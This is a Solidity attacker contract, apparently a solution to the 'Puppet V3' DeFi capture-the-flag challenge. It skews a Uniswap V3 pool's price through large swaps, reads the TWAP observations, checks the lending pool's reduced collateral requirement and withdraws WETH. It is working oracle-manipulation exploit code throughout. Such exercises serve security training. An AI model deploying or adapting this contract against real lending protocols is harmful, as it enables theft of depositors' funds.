// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";

interface IPuppetV3Pool {
    function borrow(uint256 borrowAmount) external;
    function calculateDepositOfWETHRequired(uint256 amount) external view returns (uint256);
}

interface IUniswapV3CallBack{
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

contract P3Attacker is IUniswapV3CallBack{
    IERC20Minimal public token;
    IUniswapV3Pool public v3Pool;
    IPuppetV3Pool public lendingPool;
    IERC20Minimal public weth;
    int56[] public tickCumulatives;

    constructor(address _token , address _v3Pool, address _lendingPool, address _weth){
        token = IERC20Minimal(_token);
        v3Pool = IUniswapV3Pool(_v3Pool);
        lendingPool = IPuppetV3Pool(_lendingPool);
        weth = IERC20Minimal(_weth);
    }

    function callSwap(int256 _amount) public{
        v3Pool.swap(
            address(this),
            false,
            _amount,
            TickMath.MAX_SQRT_RATIO - 1,
            ""
        );
    }

    function uniswapV3SwapCallback(int256 amount0Delta,int256 amount1Delta,bytes calldata data)external override{
        uint256 amount1 = uint256(amount1Delta);
        token.transfer(address(v3Pool), amount1);
    } 

    function getQuoteFromPool(uint256 _amountOut) public view returns (uint256 _amountIn){
        _amountIn = lendingPool.calculateDepositOfWETHRequired(_amountOut);
    }

    function observePool(uint32[] calldata _secondsAgos)
        public
        returns (
            int56[] memory _tickCumulatives,
            uint160[] memory _secondsPerLiquidityCumulativeX128s
        )
    {
        (_tickCumulatives, _secondsPerLiquidityCumulativeX128s) = v3Pool
            .observe(_secondsAgos);
        tickCumulatives.push(_tickCumulatives[0]);
        tickCumulatives.push(_tickCumulatives[1]);
    }

    function transferWeth() public {
        uint bal = weth.balanceOf(address(this));
        weth.transfer(msg.sender, bal);
    }
    

}